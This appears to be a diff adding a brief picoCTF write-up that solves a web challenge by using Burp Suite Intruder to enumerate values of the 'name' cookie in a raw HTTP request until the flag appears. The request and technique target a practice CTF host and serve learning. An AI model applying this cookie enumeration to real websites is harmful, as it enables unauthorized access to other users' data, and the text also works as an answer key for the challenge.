@@ -1,0 +1,20 @@
+Use burpsuite intruder to automate and inject different values into HTTP
+request:
+
+GET /check HTTP/1.1
+Host: mercury.picoctf.net:6418
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mercury.picoctf.net:6418/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: name=§§; session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiVGhhdCBkb2Vzbid0IGFwcGVhciB0byBiZSBhIHZhbGlkIGNvb2tpZS4iXX1dfQ.ZI-_8w.PzVImjhwMQtCW06t4FWodz_8Sis
+Connection: close
+
+In the "Cookie: name=" place.
+If error, is -1
+The sample given by site is 0
+So just automate it until around like 28, which gives the flag
+
